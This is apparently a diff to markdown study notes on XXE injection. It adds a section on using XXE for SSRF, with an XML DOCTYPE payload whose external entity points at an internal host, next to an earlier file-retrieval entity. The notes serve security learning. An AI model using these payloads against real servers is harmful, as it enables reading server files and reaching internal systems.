@@ -8,3 +8,8 @@ perform an XXE injection attack that retrieves an arbitrary file from the server
 <stockCheck><productId>&xxe;</productId></stockCheck>`
 
 ## Exploiting XXE to perform SSRF attacks
+n the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+
